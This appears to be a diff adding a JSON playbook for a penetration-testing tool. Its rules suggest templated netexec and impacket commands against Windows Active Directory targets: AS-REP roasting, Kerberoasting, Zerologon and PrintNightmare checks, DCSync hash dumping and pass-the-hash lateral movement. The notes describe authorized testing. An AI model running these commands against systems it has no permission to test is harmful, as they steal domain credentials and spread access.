@@ -1,0 +1,76 @@
+[
+  {
+    "name": "Windows 권한/토큰 열거",
+    "when": {"os": ["windows", "windows_ad"]},
+    "suggest": [
+      "netexec winrm {t} -u {user} -p {pass} -x \"whoami /all\"",
+      "netexec winrm {t} -u {user} -p {pass} -x \"whoami /priv\""
+    ],
+    "note": "SeImpersonate/SeAssignPrimaryToken 확인 시 PotatoFamily(PrintSpoofer/GodPotato) 후보. 크리덴셜 필요.",
+    "tags": ["windows", "privesc", "enum"],
+    "phase": "privesc"
+  },
+  {
+    "name": "AS-REP Roasting",
+    "when": {"os": ["windows_ad"], "ports": [88], "services": ["kerberos"]},
+    "suggest": [
+      "impacket-GetNPUsers {domain}/ -no-pass -usersfile {userlist} -dc-ip {t}",
+      "impacket-GetNPUsers {domain}/{user}:{pass} -request -dc-ip {t}"
+    ],
+    "note": "DONT_REQ_PREAUTH 계정의 AS-REP 해시 획득→오프라인 크랙(hashcat -m 18200). 출처: MITRE T1558.004",
+    "tags": ["ad", "kerberos", "creds"],
+    "phase": "access"
+  },
+  {
+    "name": "Kerberoasting",
+    "when": {"os": ["windows_ad"], "ports": [88], "services": ["kerberos"]},
+    "suggest": [
+      "impacket-GetUserSPNs {domain}/{user}:{pass} -dc-ip {t} -request"
+    ],
+    "note": "SPN 계정 TGS 해시 획득→오프라인 크랙(hashcat -m 13100). 도메인 인증 필요. 출처: MITRE T1558.003",
+    "tags": ["ad", "kerberos", "creds"],
+    "phase": "privesc"
+  },
+  {
+    "name": "Zerologon 점검",
+    "when": {"os": ["windows_ad"], "services": ["netbios", "smb", "microsoft-ds"]},
+    "suggest": [
+      "nmap -p445 --script smb2-security-mode {t}"
+    ],
+    "note": "CVE-2020-1472 (CWE-330). Netlogon AES-CFB8 IV 취약→DC 머신계정 리셋. 점검 스크립트/익스는 승인 후 수동(DC 손상 위험). 출처: NVD",
+    "tags": ["ad", "privesc", "cve"],
+    "phase": "privesc"
+  },
+  {
+    "name": "PrintNightmare 점검",
+    "when": {"os": ["windows", "windows_ad"]},
+    "suggest": [
+      "netexec smb {t} -u {user} -p {pass} -M spooler"
+    ],
+    "note": "CVE-2021-34527 (CWE-269). Print Spooler RCE/LPE. 스풀러 활성 확인. 익스는 승인 후 수동. 출처: NVD",
+    "tags": ["windows", "privesc", "cve"],
+    "phase": "privesc"
+  },
+  {
+    "name": "DCSync (도메인 해시 덤프)",
+    "when": {"os": ["windows_ad"], "ports": [445], "services": ["smb", "microsoft-ds"]},
+    "suggest": [
+      "impacket-secretsdump {domain}/{user}:{pass}@{t} -just-dc-user Administrator",
+      "netexec smb {t} -u {user} -p {pass} --ntds"
+    ],
+    "note": "DS-Replication 권한 계정으로 KRBTGT/Administrator 해시 획득→PtH/Golden Ticket. 고권한 필요. 출처: MITRE T1003.006",
+    "tags": ["ad", "lateral", "creds"],
+    "phase": "lateral"
+  },
+  {
+    "name": "Pass-the-Hash 측면이동",
+    "when": {"os": ["windows", "windows_ad"], "ports": [445, 5985], "services": ["smb", "microsoft-ds", "winrm"]},
+    "suggest": [
+      "netexec smb {t} -u {user} -H {hash}",
+      "impacket-psexec {domain}/{user}@{t} -hashes {hash}"
+    ],
+    "note": "NTLM 해시로 인증(평문 불필요). {hash} 는 LM:NT 형식. CWE-522. 출처: MITRE T1550.002",
+    "tags": ["ad", "lateral", "creds"],
+    "phase": "lateral"
+  }
+]
